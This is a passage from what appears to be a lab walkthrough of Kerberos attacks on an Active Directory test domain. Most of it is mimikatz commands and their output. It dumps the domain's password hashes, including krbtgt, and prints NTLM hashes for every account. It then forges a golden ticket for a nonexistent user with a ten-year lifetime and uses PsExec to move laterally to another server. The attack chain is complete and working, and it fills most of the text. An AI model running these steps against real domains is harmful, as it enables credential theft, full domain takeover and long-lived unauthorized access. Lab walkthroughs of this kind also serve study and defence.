Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
```

### 3.2.5. Verify ticket
```console
C:\Users\dummy>klist

Current LogonId is 0:0x3441a5

Cached Tickets: (1)

#0>     Client: nonexistentuser @ LAB.VX
        Server: MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/18/2022 9:15:16 (local)
        End Time:   4/15/2032 9:15:16 (local)
        Renew Time: 4/15/2032 9:15:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

### 3.2.6. Attempt login to service
```console
C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
1> SELECT SYSTEM_USER;
2> GO

--------------------------------------------------------------------------------------------------------------------------------
LAB\nonexistentuser

(1 rows affected)
```

# 5. Golden Ticket

## 5.1. Dump password hashes on domain controller
- Requires `Domain Admins` rights
- Information of interest: domain SID and `krbtgt` password hash

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : LAB / S-1-5-21-1470288461-3401294743-676794760

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 3ac4cccaca955597db0d11a7ffa50025

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 0000044f (1103)
User : bindaccount
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000450 (1104)
User : domainadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000451 (1105)
User : mike
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000452 (1106)
User : cindy
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000453 (1107)
User : john
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000454 (1108)
User : paul
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000455 (1109)
User : mssqlsvcacct
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000456 (1110)
User : mssqlsysadm
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000457 (1111)
User : itmanager
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 00000458 (1112)
User : itadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000003e8 (1000)
User : DC$
LM   :
NTLM : 8865ea60bb34d0b1b2984e609bebbfb5

RID  : 0000045b (1115)
User : SVR$
LM   :
NTLM : e629246410c5795d27b1f16b221cf083

RID  : 0000045c (1116)
User : CLIENT$
LM   :
NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
```

## 5.2. Create golden ticket using information retrieved from domain controller
- This can be performed on any domain member machine, without administrator rights
- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
- The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session

```console
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:nonexistentuser /domain:lab.vx /sid:S-1-5-21-1470288461-3401294743-676794760 /krbtgt:3ac4cccaca955597db0d11a7ffa50025 /ptt
User      : nonexistentuser
Domain    : lab.vx (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3ac4cccaca955597db0d11a7ffa50025 - rc4_hmac_nt
Lifetime  : 23/4/2022 4:05:49 pm ; 20/4/2032 4:05:49 pm ; 20/4/2032 4:05:49 pm
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ lab.vx' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
```

## 5.3. Use the golden ticket to laterally move to **any** domain machine
- Verify golden ticket in session

```console
C:\Users\john>hostname
CLIENT

C:\Users\john>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.161
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

C:\Users\john>klist

Current LogonId is 0:0x50b951

Cached Tickets: (1)

#0>     Client: nonexistentuser @ lab.vx
        Server: krbtgt/lab.vx @ lab.vx
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/23/2022 15:47:53 (local)
        End Time:   4/20/2032 15:47:53 (local)
        Renew Time: 4/20/2032 15:47:53 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- Attempt to connect to domain member machine

```console
C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\nonexistentuser

C:\Windows\system32>hostname
SVR

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.151
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
